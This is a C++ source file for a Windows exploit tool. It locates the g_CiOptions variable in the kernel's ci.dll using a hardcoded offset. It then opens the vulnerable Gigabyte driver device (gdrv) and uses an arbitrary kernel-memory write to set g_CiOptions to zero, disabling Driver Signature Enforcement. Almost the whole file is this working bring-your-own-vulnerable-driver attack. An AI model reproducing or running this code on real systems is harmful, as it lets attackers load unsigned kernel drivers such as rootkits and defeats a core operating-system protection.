#include "includes.h"
#include "loader.h"



int main() {
    void* mappedBase = nullptr;
    const std::wstring ciPath = L"C:\\Windows\\System32\\ci.dll";

    if ( !loader::MapCiDllToMemory( ciPath, mappedBase ) ) return 1;

    auto dos = reinterpret_cast< PIMAGE_DOS_HEADER >( mappedBase );
    if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) {
        UnmapViewOfFile( mappedBase );
        return 1;
    }

    auto nt = reinterpret_cast< PIMAGE_NT_HEADERS >(
        reinterpret_cast< BYTE* >( mappedBase ) + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE ) {
        UnmapViewOfFile( mappedBase );
        return 1;
    }

    uintptr_t validateRVA = loader::HdnGetProcAddress( mappedBase, L"CiValidateImageHeader" );
    if ( !validateRVA ) {
        UnmapViewOfFile( mappedBase );
        return 1;
    }
    
    std::cout << "[+] CiValidateImageHeader RVA: 0x" << std::hex << validateRVA << '\n';

    uintptr_t kernelCiBase = loader::GetCiDllKernelBase();
    if ( !kernelCiBase ) {
        UnmapViewOfFile( mappedBase );
        return 1;
    }
   
    std::cout << "[+] Kernel ci.dll base: 0x" << std::hex << kernelCiBase << '\n';

    uintptr_t gCiOptionsVA = loader::FindCiOptions( mappedBase, kernelCiBase );
   
    if ( !gCiOptionsVA ) return 1;

    std::cout << "[+] g_CiOptions kernel VA: 0x" << std::hex << gCiOptionsVA << '\n';

    UnmapViewOfFile( mappedBase );

    HANDLE hDev = CreateFileW( L"\\\\.\\gdrv", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr );
    if ( hDev == INVALID_HANDLE_VALUE ) {
        std::cerr << "[-] Failed to open handle to gdrv. Error: " << GetLastError() << '\n';
        system( "pause" );
        return 1;
    }
    std::cout << "[+] Opened handle to gdrv\n";

    BYTE patchValue = 0x0;  // disable test signing + CI enforcement
    if ( vul::WriteKernelMemory( hDev, gCiOptionsVA, &patchValue, sizeof( patchValue ) ) ) {
        std::cout << "[+] Successfully patched g_CiOptions at 0x" << std::hex << gCiOptionsVA << '\n';
    }
    else {
        std::cerr << "[-] Failed to write to g_CiOptions\n";
    }

    CloseHandle( hDev );
    std::cout << "[+] Done.\n";
    system( "pause" );
    return 0;
}

uintptr_t loader::FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase ) {
    constexpr uintptr_t MappedCiOptionsOffset = 0x3a308; 
    
    uintptr_t gCiOptionsAddress = kernelBase + MappedCiOptionsOffset;

    std::cout << "[+] g_CiOptions offset: 0x" << std::hex << gCiOptionsAddress << '\n';

    return gCiOptionsAddress;
}

